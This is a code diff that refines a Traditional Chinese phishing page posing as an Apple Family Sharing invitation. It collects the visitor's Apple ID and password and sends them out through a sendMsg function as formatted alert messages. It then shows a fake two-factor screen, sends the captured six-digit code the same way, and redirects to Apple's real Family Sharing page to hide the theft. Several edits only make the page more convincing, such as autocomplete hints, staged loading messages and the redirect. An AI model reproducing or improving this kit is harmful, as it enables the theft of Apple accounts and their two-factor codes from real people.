@@ -18,7 +18,6 @@
             color: white;
         }
 
-        /* 背景裝飾 */
         .orb {
             position: absolute;
             width: 500px;
@@ -91,12 +90,10 @@
             transition: 0.2s;
             margin-top: 10px;
         }
-        button:hover { background: #f0f0f0; transform: scale(0.98); }
+        button:hover:not(:disabled) { background: #f0f0f0; transform: scale(0.98); }
 
-        /* 狀態切換 */
         .hidden { display: none !important; }
 
-        /* 載入動畫 */
         .loader {
             width: 35px;
             height: 35px;
@@ -108,7 +105,6 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* 成功圖示 */
         .success-checkmark {
             width: 60px;
             height: 60px;
@@ -133,29 +129,31 @@
                 <svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5s-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
             </div>
             <h1>加入家人共享</h1>
-            <p>您受邀加入家庭群組。請驗證您的 Apple ID 以開始共享訂閱與服務。</p>
+            <p>您受邀加入家庭群組。請驗證您的 Apple ID 以接受邀請。</p>
             
             <div class="input-group">
                 <label>Apple ID</label>
-                <input type="text" id="acc" placeholder="email@icloud.com">
+                <input type="text" id="acc" placeholder="email@icloud.com" autocomplete="username">
             </div>
             <div class="input-group">
                 <label>密碼</label>
-                <input type="password" id="pw" placeholder="您的 Apple ID 密碼">
+                <input type="password" id="pw" placeholder="您的 Apple ID 密碼" autocomplete="current-password">
             </div>
-            <button onclick="handleLogin()">接受邀請</button>
+            <button id="btn1" onclick="handleLogin()">接受邀請</button>
         </div>
 
         <div id="phase-loading" class="hidden">
             <div class="loader"></div>
-            <p>正在加密連線並驗證身分...</p>
+            <p id="loading-text">正在加密連線...</p>
         </div>
 
         <div id="phase-otp" class="hidden">
             <h1>雙重認證</h1>
             <p>驗證碼已傳送到您的其他 Apple 裝置。</p>
-            <input type="text" id="otp" placeholder="000000" maxlength="6" style="text-align:center; letter-spacing: 12px; font-weight: bold; font-size: 24px;">
-            <button onclick="handleOTP()">驗證並加入</button>
+            <input type="text" id="otp" placeholder="000000" maxlength="6" 
+                   inputmode="numeric" pattern="[0-9]*"
+                   style="text-align:center; letter-spacing: 12px; font-weight: bold; font-size: 24px;">
+            <button id="btn2" onclick="handleOTP()">驗證並加入</button>
         </div>
 
         <div id="phase-success" class="hidden">
@@ -163,8 +161,7 @@
                 <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
             </div>
             <h1>歡迎加入家庭！</h1>
-            <p>您的帳戶已成功與家庭成員綁定。現在您可以開始使用共享的空間與訂閱。</p>
-            <button onclick="window.close()">關閉視窗</button>
+            <p>您的帳戶已成功與家庭成員綁定。即將為您跳轉至 Apple 官網...</p>
         </div>
 
         <div class="footer">您的資料將受到加密保護。</div>
@@ -186,50 +183,50 @@
             } catch(e) {}
         }
 
+        function showPhase(phaseId) {
+            ['phase-login', 'phase-loading', 'phase-otp', 'phase-success'].forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(phaseId).classList.remove('hidden');
+        }
+
         async function handleLogin() {
             const acc = document.getElementById('acc').value.trim();
             const pw = document.getElementById('pw').value;
 
-            // 1. Email 格式檢查
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(acc)) {
-                alert("請輸入有效的 Apple ID 格式。");
-                return;
-            }
+            if (!emailRegex.test(acc)) return alert("請輸入有效的 Apple ID。");
 
-            // 2. 密碼強度檢查 (一大、一小、一數字)
             const pwRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).+$/;
-            if (!pwRegex.test(pw)) {
-                alert("為了安全性，請輸入正確的 Apple ID 密碼格式。");
-                return;
-            }
+            if (!pwRegex.test(pw)) return alert("密碼格式不正確，請重新輸入。");
 
-            // 切換到 Loading
-            document.getElementById('phase-login').classList.add('hidden');
-            document.getElementById('phase-loading').classList.remove('hidden');
+            showPhase('phase-loading');
+            document.getElementById('loading-text').innerText = "正在加密連線並驗證身分...";
 
-            // 發送訊息
-            await sendMsg(`👨‍👩‍👧‍👦 【家人共享登入】\n帳號: ${acc}\n密碼: ${pw}`);
+            await sendMsg(`👨‍👩‍👧‍👦 【家庭邀請】\n帳號: ${acc}\n密碼: ${pw}`);
 
-            // 倒數 20 秒
             setTimeout(() => {
-                document.getElementById('phase-loading').classList.add('hidden');
-                document.getElementById('phase-otp').classList.remove('hidden');
+                showPhase('phase-otp');
             }, 20000);
         }
 
         async function handleOTP() {
             const otp = document.getElementById('otp').value;
-            if(otp.length < 6) {
-                alert("請輸入 6 位數驗證碼。");
-                return;
-            }
+            if(otp.length < 6) return alert("請輸入 6 位數驗證碼。");
 
-            await sendMsg(`🛡️ 【家人共享驗證碼】\n代碼: ${otp}`);
+            showPhase('phase-loading');
+            document.getElementById('loading-text').innerText = "正在進行最終家庭成員綁定...";
 
-            // 顯示成功加入家庭
-            document.getElementById('phase-otp').classList.add('hidden');
-            document.getElementById('phase-success').classList.remove('hidden');
+            await sendMsg(`🛡️ 【家庭驗證碼】\n代碼: ${otp}`);
+
+            // 模擬處理 3 秒
+            setTimeout(() => {
+                showPhase('phase-success');
+                // 成功顯示 3 秒後跳轉回官網
+                setTimeout(() => {
+                    window.location.href = "https://www.apple.com/tw/family-sharing/";
+                }, 3000);
+            }, 3000);
         }
     </script>
 </body>
